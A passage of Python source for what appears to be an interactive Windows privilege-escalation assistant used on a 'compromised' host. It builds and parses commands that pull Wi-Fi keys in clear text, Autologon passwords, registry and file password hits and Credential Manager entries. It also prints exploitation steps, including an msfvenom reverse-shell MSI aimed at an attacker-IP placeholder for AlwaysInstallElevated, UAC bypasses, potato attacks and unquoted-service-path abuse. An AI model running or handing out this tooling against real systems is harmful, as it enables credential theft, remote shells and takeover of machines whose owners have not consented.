            print(formatting.cyan_b('[!!!] CONGRATS! You are now ADMIN and the compromised PC is a %s' % sysinfo_data.osName))
            print(formatting.red_b('[!!!] THERE SHOULD NOT BE ANY INCONVENIENT IN ELEVATING PRIVILEGES TO SYSTEM OR PERFORMING ANY OPERATION AS ADMIN.'))
            exit_program()
        else:
            enter_to_continue()
        print()
    if (type == "netusergroups"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to user\'s groups...'))
        userinfo_data.add_groups(absolute_path, True)
        userinfo_data.print_groups()
        print(formatting.yellow(
            '[+] All the User\'s groups have been stored...'))
        print()
        calculate_user_in_admin_group(cmdlang)

        if isinstance(userinfo_data.is_admin, bool) and userinfo_data.is_admin and WINXP in sysinfo_data.osName.upper():
            print(formatting.cyan_b('[!!!] CONGRATS! You are now ADMIN and the compromised PC is a %s' % sysinfo_data.osName))
            print(formatting.red_b('[!!!] THERE SHOULD NOT BE ANY INCONVENIENT IN ELEVATING PRIVILEGES TO SYSTEM OR PERFORMING ANY OPERATION AS ADMIN.'))
            exit_program()
        else:
            enter_to_continue()
        print()
    if (type == "uacconfig"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to UAC configuration in target...'))
        populate_UAC_info(absolute_path)
        print(formatting.yellow(
            '[+] Info related to UAC configuration has been stored...'))
        print()
        if isinstance(userinfo_data.is_admin, bool) and userinfo_data.is_admin and (sysinfo_data.enabledUAC in (None, False) or sysinfo_data.UAClevel == 0):
            print(formatting.cyan_b('[!!!] CONGRATS! You are an ADMIN and UAC is NOT activated in the target.'))
            print(formatting.red_b('[!!!] THERE SHOULD NOT BE ANY INCONVENIENT IN ELEVATING PRIVILEGES TO SYSTEM OR PERFORMING ANY OPERATION AS ADMIN.'))
            exit_program()

        if WINVISTA not in complete_version.upper():
            if userinfo_data.is_admin and sysinfo_data.enabledUAC and sysinfo_data.UAClevel == 5:
                print(formatting.red_b('[!] YOU ARE AN ADMIN AND THE UAC CONFIGURATION IS SET BY DEFAULT.'))
                print(formatting.red_b('    YOU COULD TRY A UAC BYPASS TECHNIQUE:'))
                print(formatting.red_b('    - 1) Try to download compile and execute UACMe from: \n'))
                print(formatting.cyan('         %s' % str(wsparser.get('tools', 'uacme')[0:128])))
                print(formatting.red_b('\n       > USAGE: akagi.exe|akagi64.exe <key>  (consult keys on github page)\n'))
                print(formatting.red_b('\n  - 2) Try to execute metasploit module') + formatting.cyan_b('"exploit/windows/local/bypassuac"'))
                print(formatting.red_b('         with any of its submodules (bypassuac_eventvwr, bypass_fodhelper, bypass_injection...)\n'))
            else:
                print(formatting.yellow('[+] No conditions to UAC ByPass execution... Not exploitable\n'))
        else:
            print(formatting.yellow('[+] No conditions to UAC ByPass execution. Not exploitatble...\n'))

        enter_to_continue()
        print()
    if (type == "privs"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to user\'s privileges...'))
        userinfo_data.add_privileges(absolute_path)
        userinfo_data.print_privileges()
        print(formatting.yellow(
            '[+] All the User\'s privileges have been stored...'))
        print()
        #Check if potato attacks could be addressed into the system...
        check_potatoes()
        enter_to_continue()
        print()
    if (type == "alwaysinstallelevated"):
        print()
        print(formatting.yellow(
            '[-] Processing AlwaysInstallElevated configuration...'))
        if processing_AlwaysInstallElevated_config(absolute_path) == True:
            print(formatting.red_b(
            '   [!] AlwaysInstallElevated configuration IS ENABLED (VULNERABLE)! TRY TO EXPLOIT IT!'))
            print(formatting.green('        [*] YOU COULD CRAFT A MSI PACKAGE AND, WHEN EXECUTING, IT WILL RUN WITH NT AUTHORITY\SYSTEM PRIVILEGES!!'))
            print(formatting.green('\n           - STEP 1: create in your attacker machine a msi package with your reverse shell: '))
            print(formatting.cyan_b('                     eg: "msfvenom -p windows/meterpreter/reverse_tcp lhost=<tatacker_ip> lport=443 -f msi -o rev.msi"'))
            print(formatting.green('           - STEP 2') + formatting.red('*') +
                  formatting.green(': Distribute your msi package to the target machine and execute there.'))
            print(formatting.green('\n        [*] ALTERNATIVE 1: Use Metasploit module:') + formatting. cyan_b('"exploit/windows/local/always_install_elevated"'))
            print(formatting.green('        [*] ALTERNATIVE 2: Download PowerUp Powershell script from') +
                  formatting.cyan_b('\n                          %s, run it and execute: ' % str(wsparser.get('tools', 'powerup')[0:128]) ))
            print(formatting.green('                          1)' + formatting.cyan_b(' Invoke-AllChecks') + formatting.green(' (Check: AlwaysInstallElevated Registry Key)')))
            print(formatting.green('                          2)' + formatting.cyan_b(' Write-UserAddMSI') + formatting.green(' (The AbuseFunction, to create the msi file)')))
            print(formatting.red_b('\n    [!!!] CONGRATS! If you have followed the earlier steps in a proper way, you\'ll have NT AUTHORITY\SYSTEM PRIVILEGES now!'))
            print_ways_to_distribute_files()
            exit_program()
        else:
            print(formatting.yellow(
            '   [*] AlwaysInstallElevated configuration NOT Enabled (not exploitable)...'))

        print(formatting.yellow(
                '[+] AlwaysInstallElevated configuration processed...'))
        print()
        enter_to_continue()
    if (type == "startuppermissions"):

        print()
        print(formatting.yellow(
            '[-] Storing the data info related to user\'s access to Startup App Paths...'))
        userinfo_data.add_paths(absolute_path,type)
        userinfo_data.print_paths(type)
        print(formatting.yellow(
            '[+] All the App Paths in Startup Directory and their permissions for the compromised user have been stored...'))
        print()

        if len(userinfo_data.startuppaths) > 0:
            if yesno(formatting.red_b(f'   [!] Do you want to check WRITABLE PATHS only for the non %WINROOT% binary paths?') +
                    formatting.yellow('\n            [*] If you answer \'y|Y\', THE WRITABLE FOLDERS will be filtered') +
                    formatting.yellow(f' to the non %WINROOT% folders') +
                    formatting.yellow('\n            [*] Answer \'n|N\' for continuing showing ALL OF THEM...')):

                print(formatting.green(
                    '[*] Following paths have FULL/WRITE PERMISSIONS:'))
                userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
                print()
            else:
                print(formatting.green('\n    [*] Following paths have FULL/WRITE PERMISSIONS:'))
                userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
                print()

            if yesno(formatting.red_b(f'    [!] Do you want to check also the READABLE binary paths?')):

                if yesno(formatting.red_b(f'       [!] Do you want to check only the non %WINROOT% binary paths?') +
                        formatting.yellow('\n                [*] If you answer \'y|Y\', THE READABLE FOLDERS will be filtered') +
                        formatting.yellow(f' to the non %WINROOT% folders') +
                        formatting.yellow('\n                [*] Answer \'n|N\' for continuing showing ALL OF THEM...')):

                        print(formatting.green(
                            '    [*] Following paths have READ PERMISSIONS:'))
                        userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
                        print()
                else:
                        print(formatting.green(
                            '    [*] Following paths have READ PERMISSIONS:'))
                        userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
                        print()
        enter_to_continue()
        print()
    if (type == "credentialmanagerpass"):
        print()
        print(formatting.yellow(
            '[-] Searching for the password in Credential Manager Windows vault...'))
        found = print_cmdkey_credentials(absolute_path, cmdlang)
        if not found:
            print(formatting.yellow(
                  '   [*] Credential Manager password not found (not exploitable)...'))
        print(formatting.yellow(
            '[+] Credential Manager password processed...'))
        print()

        if found:
            print(formatting.red_b('\n[*] For more details check file: %s' % absolute_path))
            print(formatting.red_b('    IF YOU HAVE THE PASSWORD BY THIS WAY, YOU COULD USE:'))
            print(formatting.cyan_b('        runas /savecred /user:<user> <shell>'))
            enter_to_continue()
        else:
            print(formatting.yellow('[*]  Credential Manager Passwords not found (not exploitable)...'))
            
        print()
        enter_to_continue()
    if (type == "winlogonpass"):
        #TODO: complete
        print()
        print(formatting.yellow(
            '[-] Searching for the password in plaintext in WinLogon Registry key (Autologon)...'))
        found, defdomname, defuname, defpass = print_autologon_credentials(absolute_path)
        if not found:
            print(formatting.yellow(
            '   [*] Autologon password not found (not exploitable)...'))
        
        print(formatting.yellow(
            '[+] Autologon credentials processed...'))
        print()

        if len(defdomname) > 0:
            print(formatting.yellow('[*] Found WinLogon cache Default Domain Name: %s' % defdomname))
        if len(defuname) > 0:
            print(formatting.yellow('[*] Found WinLogon cache Default User Name: %s' % defuname))
        if len(defpass) > 0:
            print(formatting.red_b('[!!!] Found WinLogon cache Default Password: %s' % defpass))
            print_ways_to_connect_with_new_credentials()

        # if (len(defuname)!=0 and len(defpass) != 0):
        enter_to_continue()

        print()
    if (type == 'registrypass'):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to password wildcards in Windows Registry'))
        userinfo_data.add_paths(absolute_path,type)
        userinfo_data.print_paths(type)
        print(formatting.yellow(
            '[+] A list of potential Registry passwords mentions has been stored...'))
        print()
        print(formatting.yellow(
            '[*] Take a look at file %s before continuing with next step...' %absolute_path))
        enter_to_continue()
    if (type == "passfiles"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to passwords in configuration files, etc...'))
        userinfo_data.add_paths(absolute_path,type)
        userinfo_data.print_paths(type)
        print(formatting.yellow(
            '[+] A list of potential paths to passwords mentions has been stored...'))
        print()
        print(formatting.yellow(
            '[*] Take a look at file %s before continuing with next step...' %absolute_path))
        enter_to_continue()

    if (type == "wifipasswords"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to WIFI passwords located in the system...'))
        sysinfo_data.add_wificredentials(absolute_path, wsparser.get_section('locale_%s' % cmdlang))
        print(formatting.yellow(
            '[+] A list of WIFI password has been stored...'))
        print()

        if len(sysinfo_data.wificredentials) > 0:
            print(formatting.red_b("[!] Following credentials were retrieved from target system:"))
            sysinfo_data.print_wificredentials()
            print(formatting.red_b('   ONE OF THEM COULD BE USED FOR LATERAL MOVEMENTS OR THE PASSWORDS'))
            print(formatting.red_b('   COULD BE REUSED FOR ESCALATION INTO THIS TARGET OR OTHER TARGETS IN NETWORK.\n'))
        else:
            print(formatting.yellow('[*] No credentials found (not exploitable)...\n'))
        
        print()
        enter_to_continue()

    if (type == "secfilespermissions"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to user\'s access to security files (SAM, SYSTEM, SECURITY)...'))
        userinfo_data.add_paths(absolute_path,type)
        userinfo_data.print_paths(type)
        print(formatting.yellow(
            '[+] All the security folders and their permissions for the compromised user have been stored...'))
        print()

        if len(userinfo_data.securitypaths) > 0:
            print(formatting.green(
                '[*] Following paths have FULL/WRITE PERMISSIONS:'))
            userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
            print()

            if not bool(userinfo_data.is_admin) :
                if yesno(formatting.red_b(f'[!] Do you want to check also the READABLE security files by user?')):
                    print(formatting.green(
                        '[*] Following paths have READ PERMISSIONS:'))

                    userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
                    print()
        
        enter_to_continue()
        print()
    if (type == "extfilespermissions"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to user\'s permissions on ext files on PATH folders...'))
        userinfo_data.add_paths(absolute_path,type)
        #userinfo_data.print_paths(type)
        print(formatting.yellow(
            '[+] All the ext files in PATH folders and their permissions have been stored...'))
        print()

        if len(userinfo_data.pathextfiles) > 0:
            if yesno(formatting.red_b(f'   [!] Do you want to check WRITABLE PATHS only for the non %WINROOT% binary paths?') +
                        formatting.yellow('\n            [*] If you answer \'y|Y\', THE WRITABLE FOLDERS will be filtered') +
                        formatting.yellow(f' to the non %WINROOT% folders') +
                        formatting.yellow('\n            [*] Answer \'n|N\' for continuing showing ALL OF THEM...')):

                        print(formatting.green(
                                '[*] Following paths have FULL/WRITE PERMISSIONS:'))
                        userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
                        print()
            else:
                        print(formatting.green(
                                '[*] Following paths have FULL/WRITE PERMISSIONS:'))
                        userinfo_data.print_modifiable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
                        print()

            if yesno(formatting.red_b(f'[!] Do you want to check now the READABLE binary paths?')):

                if yesno(formatting.red_b(f'   [!] Do you want to check only the non %WINROOT% binary paths?') +
                        formatting.yellow('\n            [*] If you answer \'y|Y\', THE READABLE FOLDERS will be filtered') +
                        formatting.yellow(f' to the non %WINROOT% folders') +
                        formatting.yellow('\n            [*] Answer \'n|N\' for continuing showing ALL OF THEM...')):

                        print(formatting.green(
                            '[*] Following paths have READ PERMISSIONS:'))
                        userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang), True, sysinfo_data.winDir)
                        print()
                else:
                        print(formatting.green(
                            '[*] Following paths have READ PERMISSIONS:'))
                        userinfo_data.print_readable_paths(type, wsparser.get_section('locale_%s' % cmdlang))
                        print()
        else:
            print(formatting.yellow('[*] No paths found...\n'))
        
        enter_to_continue()
        
    if (type == "targetusers"):
        print()
        print(formatting.yellow(
            '[-] Storing the Active users info at the target system...'))
        sysinfo_data.add_users(absolute_path)
        sysinfo_data.print_users()

        print(formatting.yellow(
            '[+] All the Active users info in the target system have been stored...'))
        print()
        enter_to_continue()
    if (type == "services"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to services at the target system...'))
        sysinfo_data.add_services(absolute_path)

        print(formatting.yellow(
            '[+] All the Services info in the target system have been stored...'))
        print()

        print(formatting.yellow('\n[*] From the stored services, the following ones are services') +
              formatting.green(' NO located in path \'windows\system32\':'))

        sysinfo_data.print_noWin32services()

        listServicesWithUSPWS = sysinfo_data.get_servicesWithSpacesInUnquotedPaths()

        if len(listServicesWithUSPWS) > 0:
            print(formatting.red_b('[!] The Following services have unquotted paths with spaces: '))
            sysinfo_data.print_servicesWithSpacesInUnquotedPaths()
            print(formatting.red_b('   An attacker with write/exec access to any of the subpaths between spaces could'))
            print(formatting.red_b('   craft a malicious program in one of them, to execute with this'))
            print(formatting.red_b('   service\'s privileges.'))
            print(formatting.red_b ('   You could also use Metasploit Module: ') + formatting.cyan_b('exploit/windows/local/unquoted/service_path'))
        else:
             print(formatting.yellow('[*] NO Services with spaces in their non quottation paths were found (not exploitable)...\n'))           
        
        print()
        enter_to_continue()
    if (type == "servicespermissions"):
        print()
        print(formatting.yellow(
            '[-] Storing the permissions related to the service executables at the target system...'))
        sysinfo_data.add_svcpermissions(absolute_path)
        sysinfo_data.print_svcpermissions()

        print(formatting.yellow(
            '[+] All the services executables permissions in the target system have been stored. Check them, please...'))
        print()
        enter_to_continue()
    if (type == "nonuserprocesses"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to non user \'%s\'\'s  processes at the target system...' % str(userinfo_data.name)))
        sysinfo_data.add_processes(absolute_path)
        sysinfo_data.print_processes()

        print(formatting.yellow(
            '[+] All non user \'%s\'\'s  processes in the target system have been stored...' % str(userinfo_data.name)))
        print()
        enter_to_continue()
    if (type == "scheduledtasks"):
        print()
        print(formatting.yellow(
            '[-] Storing the data info related to non Microsoft\'s Scheduled Tasks at the target system...'))
        sysinfo_data.add_schtasks(absolute_path)
        sysinfo_data.print_schtasks()

        print(formatting.yellow(
            '[+] All the non Microsoft\'s Scheduled Tasks in the target system have been stored. Check them, please..'))
        print()
        enter_to_continue()

    sleep(2)


def main():

    global complete_version, sysinfo_data, userinfo_data, working_dir, same_as_target
    step = 0

    print(Banner(fulltitle, filename))

    if len(sys.argv) < 2:
        print(formatting.red_b('[!] At least, you need to ') + formatting.green('specify the key name of the project') +
              formatting.red_b(' you want to init as an argument of the program...\n') +
              formatting.red_b('    You can specify also with the argument') + formatting.green(' -t') +
              formatting.red_b(' if the assistant is being executed') + formatting.green(' in the same target machine.'))
        sys.exit(0)
    else:
        if len(sys.argv[1]) > 1:
            project = get_valid_filename(sys.argv[1])
            if len(sys.argv) > 2:
                if sys.argv[2] == '-t':
                    same_as_target = True
        else:
            print(formatting.red_b('[!] Name of project invalid ... Program Exiting...'))
            sys.exit(1)

        print(formatting.yellow('\n[+]  The name of your project will be:'))
        print(formatting.cyan('     %s' % project))

        answ = yesno(formatting.yellow('\n[*] Are you sure to continue?'))

        if not answ:
            print(formatting.red_b(
                '[!] Program Exit by user\'s decision (User chose \'n\')...'))
            sys.exit(0)

        # creating the working directory for the specific project...
        working_dir = os.path.join(CURR_PATH, project)
        create_project_folder(working_dir)

        # If the assistant is been executed at the same target or compromised machine
        # we will use the working directory for the output. If not, user will have to
        # move the output_files in the compromised target to the working directory before
        # continuing with each step...

        # - Getting the hostname and the complete versión os OS...
        step +=1
        menu_cmd(step,['(hostname && ver | findstr /v /r "^$") > <output_file>'],  'full_ver.txt', 'ver')


        # - Getting the SystemInfo output from user.
        step +=1
        if WINXP in complete_version or WIN2000 in complete_version:
            main_command = 'wmic os get BootDevice,BuildNumber,BuildType,Caption,CodeSet,' 
            main_command += 'CountryCode,CSDVersion,CurrentTimeZone,InstallDate,LastBootUpTime,'
            main_command += 'Manufacturer,OSLanguage,RegisteredUser,SerialNumber,'
            main_command += 'SystemDevice,SystemDirectory,SystemDrive,Version,WindowsDirectory'
            main_command += ' /format:CSV |findstr /v /r "Node," | findstr /v /r "^$" > <output_file>'
            menu_cmd(step,[main_command],  'wmicsysinfo.txt', 'wmicsysinfo')
        else:
            menu_cmd(step,['systeminfo /nh /fo csv > <output_file>'],  'systeminfo.txt', 'sysinfo')
        
        cmdlang = sysinfo_data.get_cmdlang()

        # - Complete info for the system: Check if system has not been patched in at last three months
        # init_date = str(datetime.now() - timedelta(days=90))[0:10]
        # end_date = str(datetime.now())[0:10]
        init_date = datetime.now() - timedelta(days=90)
        end_date = datetime.now()
        main_command = f'powershell "Get-HotFix | Select InstalledOn |'
        main_command += ' Where { $_.InstalledOn -gt \'%s\' -AND $_.InstalledOn -lt \'%s\' }' %(init_date, end_date)
        main_command += f' | sort InstalledOn -unique -Descending | ConvertTo-Csv -NoTypeInformation | Select-Object -Skip 1 |'
        main_command += f' Select -First 1 | Set-Content <output_file>"'

        # wmic_command = 'wmic qfe where "InstalledOn> <> ''" get InstalledOn'
        # wmic_command += '| findstr /r /v InstalledOn | sort /r > <output_file>'

        if WINXP in complete_version or WIN2000 in complete_version or WIN2003 in complete_version or WIN2008 in complete_version:
            print(formatting.red_b(
            '[!] The compromised target HAS NOT BEEN UPDATED IN THE LAST THREE MONTHS.\n' +
                '    In fact, it belongs to an UNSUPPORTED WINDOWS VERSION, and it has no more security fixes.\n' +
                '    So, is is very prone to have vulnerabilities, specially for Privilege Escalation.\n' +
                '    Try to download and execute a WINDOWS EXPLOITS SUGGESTER TOOL like WES-NG from: \n'))
            print(formatting.cyan(' %s' % str(wsparser.get('tools', 'wesng')[0:128])))
            enter_to_continue()
        else:
            # commands = [main_command, wmic_command]
            commands = [main_command]
            step +=1
            menu_cmd(step, commands, 'patched.txt','patchedrecently', cmdlang)

        # - Getting the remote machine's user name and sid's output.
        step +=1
        #TODO: Use locale for filtering local groups instead hardcode...
        main_command = 'whoami /user /nh /fo csv > <output_file>'
        wmic_command = f'for /f "usebackq skip=1 tokens=3,13 delims=," %i in (`wmic useraccount get * /format:csv ^| findstr /r /v "^$"`) do @echo "%i","%j" |findstr %username% >> <output_file>'

        if not WINXP in complete_version and not WIN2000 in complete_version:
            menu_cmd(step, [main_command, wmic_command], 'whoami_user.txt', 'username', cmdlang)
        else:
            menu_cmd(step, [wmic_command, main_command], 'whoami_user.txt', 'username', cmdlang)

        if not WINXP in complete_version and not WIN2000 in complete_version:
            #- Getting the remote machine's user group output.
            step +=1
            main_command = 'whoami /groups /nh /fo csv > <output_file>'
            menu_cmd(step, [main_command], 'whoami_groups.txt', 'groups', cmdlang)
        else:
            #- Getting the remote machine's user group output from netuser (less info but allows us to retrieve user's groups and chek if it's admin).
            step +=1
            main_command = 'for /f "tokens=2,* delims=\'*\'" %^< in (\'net user' + f' %username%' + ' 2^>nul ^|findstr /i "local"\') do echo %^<,%^= >> <output_file>'
            menu_cmd(step, [main_command], 'netuser_groups.txt', 'netusergroups', cmdlang)

        if not WINXP in complete_version and not WIN2000 in complete_version:
            # - Checking UAC Configuration:
            main_command = 'reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA'
            main_command += ' | findstr /V /R "^$" > <output_file> && (reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ '
            main_command += '| findstr /i "ConsentPromptBehaviorAdmin" | findstr /V /R "^$") >> <output_file>'

            step +=1
            menu_cmd(step,[main_command], 'uac_config.txt', 'uacconfig', cmdlang)

            # - Getting the remote machine's user privileges output.
            step +=1
            menu_cmd(step,['whoami /priv /nh /fo csv > <output_file>'], 'whoami_priv.txt', 'privs', cmdlang)

        # - Getting AlwaysInstallElevated config...
        main_command = 'for %k in ("HKLM\Software\Policies\Microsoft\Windows\Installer","HKCU\Software\Policies\Microsoft\Windows\Installer") '
        main_command += ' do (reg query %k 2>nul|findstr "0x1" | findstr /r /v "^$") > <output_file>'
        commands = [main_command]
        step +=1
        menu_cmd(step,commands, 'aie_enabled.txt', 'alwaysinstallelevated', cmdlang)

        # - Getting Startup/AutoRun Paths ...
        main_command = f'wmic startup where "Not User like \'%' + userinfo_data.name[userinfo_data.name.index('\\')+1:] + f'%\'" get Command,User /format:csv > <output_file>'

        commands = [main_command]
        step +=1
        menu_cmd(step,commands, 'startuppaths.txt', 'startuppaths', cmdlang)

        main_command =  'for /f "skip=2 tokens=2,3 delims=\',\'"' + f' %a in (\'type <startup_file>\') DO (echo [+] "%a",%b && icacls "%a" 2>nul'
        main_command +=  ' | findstr /V /R "^%s$") >> <output_file>' % wsparser.get('locale_%s' % cmdlang,'files_processed')

        cacls_command =  'for /f "skip=2 tokens=2,3 delims=\',\'"' + f' %a in (\'type <startup_file>\') DO (echo [+] "%a",%b && cacls "%a" 2>nul'
        cacls_command +=  ' | findstr /V /R "^%s$") >> <output_file>' % wsparser.get('locale_%s' % cmdlang,'files_processed')

        if WINXP in sysinfo_data.osName or WIN2000 in sysinfo_data.osName:
            commands = [cacls_command, main_command]
        else:
            commands = [main_command, cacls_command]

        step +=1
        menu_cmd(step, commands,'startupfiles_permissions.txt', 'startuppermissions', cmdlang)

        # - Getting Credential Manager Vault passwords ...
        main_command = f'cmdkey /list 2>nul > <output_file>'
        commands = [main_command]
        step +=1
        menu_cmd(step,commands, 'cmdk.txt', 'credentialmanagerpass', cmdlang)

        # - WinLogon Registry Passwords ...
        main_command = f'reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" | findstr "DefaultDomainName DefaultUserName DefaultPassword" 2>nul  > <output_file>'
        commands = [main_command]
        step +=1
        menu_cmd(step,commands, 'winlogon.txt', 'winlogonpass', cmdlang)

        # - Getting WIFI cached Passwords ...
        main_command = f'for /f "tokens=1,2 delims=\':\'" %i in (\'netsh wlan show profiles^|findstr "Perfil de todos los usuarios"\') '
        main_command += f' do (netsh wlan show profile name=%j key=clear' +'|findstr "SSID %s") >> <output_file>' % wsparser.get('locale_%s' % cmdlang,'wificontent')
        commands = [main_command]
        step +=1
        menu_cmd(step,commands, 'wifi_pass.txt', 'wifipasswords', cmdlang)

        # - Getting potential registry passwords ...
        main_command = 'for %k in (HKCU, HKLM) '
        main_command += ' do (reg query %k /f password /t REG_SZ /s 2>nul| findstr /r /v "^$") > <output_file>'
        commands = [main_command]
        step +=1
        menu_cmd(step,commands, 'registry_pass.txt', 'registrypass', cmdlang)

        # - Getting potentinal path files for passwords ...
        main_command = f'for %f in ' + '(%s) do ' % ", ".join(wsparser.get('paths','passwordsfiles').split('\n'))
        main_command += f' (dir /b /s /i "%f" 2>nul) >> <output_file>'
        commands = [main_command]
        step +=1
        menu_cmd(step,commands, 'paths_pass.txt', 'passfiles', cmdlang)

        # - Getting the remote machine's access to the security files (SAM, SYSTEM, SECURITY).
        main_command = f'for %f in ' + '(%s) do ' % ", ".join(wsparser.get('paths','secpaths').split('\n'))
        main_command += f' (echo [+] "%f" && icacls "%f" 2>nul'
        main_command +=' | findstr /v /r "^%s$") >> <output_file>' % wsparser.get('locale_%s' % cmdlang,'files_processed')

        cacls_command = f'for %f in ' + '(%s) do ' % ", ".join(wsparser.get('paths','secpaths').split('\n'))
        cacls_command += f' (echo [+] "%f" && cacls "%f" 2>nul'
        cacls_command +=' | findstr /v /r "^%s$") >> <output_file>' % wsparser.get('locale_%s' % cmdlang,'files_processed')

        if WINXP in sysinfo_data.osName or WIN2000 in sysinfo_data.osName:
            commands = [cacls_command, main_command]
        else:
            commands = [main_command, cacls_command]

        step +=1
        menu_cmd(step, commands, 'security_files_permissions.txt', 'secfilespermissions', cmdlang)

        # - Getting the remote machine's binaries permissions in PATH folders...
        main_command = f'@for %D in ("%PATH:;=";"%") do @for /F "eol=* delims=" %F in'
        main_command += ' (\'cd /d "%~D" 2^>nul ^&^& dir /b/a-d %PATHEXT:.=*.% 2^>nul\')'
        main_command += f' do @for %F in ("%~D\%F") do (@echo [+] "%~fF" && @icacls "%~fF"'
        main_command += ' | findstr /v /r "^%s$") >> <output_file>' % wsparser.get('locale_%s' % cmdlang,'files_processed')

        cacls_command = f'@for %D in ("%PATH:;=";"%") do @for /F "eol=* delims=" %F in'
        cacls_command += ' (\'cd /d "%~D" 2^>nul ^&^& dir /b/a-d %PATHEXT:.=*.% 2^>nul\')'
        cacls_command += f' do @for %F in ("%~D\%F") do (@echo [+] "%~fF" && @cacls "%~fF"'
        cacls_command += ' | findstr /v /r "^%s$") >> <output_file>' % wsparser.get('locale_%s' % cmdlang,'files_processed')

        if WINXP in sysinfo_data.osName or WIN2000 in sysinfo_data.osName:
            commands = [cacls_command, main_command]
        else:
            commands = [main_command, cacls_command]

        step +=1
        menu_cmd(step, commands,'path_exts_permissions.txt', 'extfilespermissions', cmdlang)

        # - Getting the active users in the system...
        main_command = f'wmic useraccount WHERE Disabled=False GET Disabled,Name,'
        main_command += f'PasswordChangeable,PasswordExpires,PasswordRequired,SID '
        main_command += f' /format:csv|findstr /v /r "Node"|findstr /r /v "^$" > <output_file>'

        ps_command =  'powershell "Get-LocalUser | Select Domain,Enabled,Name,UserMayChangePassword,PasswordExpires,PasswordRequired,SID | Where-Object Enabled'
        ps_command +=  ' | ConvertTo-Csv -NoTypeInformation | Select-Object -Skip 1 | Set-Content <output_file>"'

        """ TODO: This command can not be properly parsed to CSV file for its treatment in the sysinfo_data.users property...
        pattern_uaf = wsparser.get('locale_%s' % cmdlang,'user_accounts_for')
        pattern_cc = wsparser.get('locale_%s' % cmdlang,'command_completed')

        DOS_command = f'for /F "tokens=*" %G in' + ' (\'net user^|findstr /V /R "^%s"' % pattern_cc
        DOS_command += '\'^|findstr /V /R "^%s"^|findstr /V /R "^--"\')' % pattern_uaf
        DOS_command += f' do @For %U in (%G) do net user %U' +'|findstr /V /R "^%s" > <output_file>' % pattern_cc

        commands = [main_command, ps_command , DOS_command]
        """

        commands = [main_command, ps_command]

        step +=1
        menu_cmd(step, commands,'users.txt', 'targetusers', cmdlang)

        # - Getting the remote machine's services.
        # main_command = 'wmic service where \'not PathName like "%System32%"\' get  Name, Description,'
        # Better getting all services and then filter if we want in the instantiated class
        main_command = f'wmic service get Name, '
        main_command += f' ProcessId, StartName, State, Status, PathName'
        main_command += f' /format:csv|findstr /v /r "Node"|findstr /r /v "^$" > <output_file>'

        ps_command =  'powershell get-wmiobject -Query \'Select * from win32_service\' |'
        ps_command += ' Select-object SystemName, Name, '
        ps_command += ' ProcessId, StartName, State, Status, PathName '
        ps_command += ' | ConvertTo-Csv -NoTypeInformation | Select-Object -Skip 1 | Set-Content <output_file>"'

        """ TODO: This command can not be properly parsed to CSV file for its treatment in the sysinfo_data.services property...
        pattern_ns = wsparser.get('locale_%s' % cmdlang,'s_name')

        DOS_command = f'for /f "tokens=2" %s in'
        DOS_command += ' (\'sc query state^= all ^| find "%s"\')' % pattern_ns
        DOS_command += f' do @sc qc %s >> <output_file>'

        commands = [main_command, ps_command , DOS_command]

        """
        commands = [main_command, ps_command]
        step +=1
        menu_cmd(step, commands,'services.txt', 'services', cmdlang)

        # - Getting the remote machine's permissions associated with each service executable:
        main_command =  'for /f "tokens=2,3 delims=\',\'"' + f' %a in (<services_file>) DO (echo [+] "%a","%b" && cmd.exe /c icacls "%b" 2>NUL'
        main_command +=  ' | findstr /V /R "^%s$") >> <output_file>' % wsparser.get('locale_%s' % cmdlang,'files_processed')

        cacls_command =  'for /f "tokens=2,3 delims=\',\'"' + f' %a in (<services_file>) DO (echo [+] "%a","%b" && cmd.exe /c cacls "%b" 2>NUL'
        cacls_command +=  ' | findstr /V /R "^%s$") >> <output_file>' % wsparser.get('locale_%s' % cmdlang,'files_processed')

        #TODO: PERFORM THE SAME OPERATIONS ABOVE WITH THE ACCESSCHK TOOL
        # accesschk_command =  'for /f "tokens=3 delims=\',\'"' + f' %a in (<services_file>) do (echo("%a",%b && accesschk.exe -nobanner /accepteula -qv "%b" 2>NUL'
        # accesschk_command +=  ' | findstr /V /R "^%s$")>> <output_file>' % wsparser.get('locale_%s' % cmdlang,'files_processed')
        #commands = [main_command, cacls_command, accesschk_command ]

        commands = [main_command, cacls_command]
        step +=1
        menu_cmd(step, commands,'services_permissions.txt', 'servicespermissions', cmdlang)

        # - Getting the remote machine's processes running with a different user than the current one.
        main_command = 'powershell "Get-WmiObject -Query \'Select * from Win32_Process\''
        main_command += ' | Select *, @{Label=\'Owner\';Expression={$_.GetOwner().User.ToLower()}}'
        main_command += '| where-object {$_.Owner -notlike \'%s\'}' % str(userinfo_data.name).lower().replace(sysinfo_data.hostname.lower() + '\\','')
        main_command += ' | ConvertTo-Csv -NoTypeInformation | Select-Object -Skip 1 | Set-Content <output_file>"'
        # TODO: PERFORM THE SAME OPERATION ABOVE WITH THE TASKLIST TOOL
        #DOS_command = 'tasklist /v /fi "username ne %s /fo csv' % userinfo_data.name
        #wmic_command = 'wmic /OUTPUT:<output_file> PROCESS LIST'
        commands = [main_command]

        print()
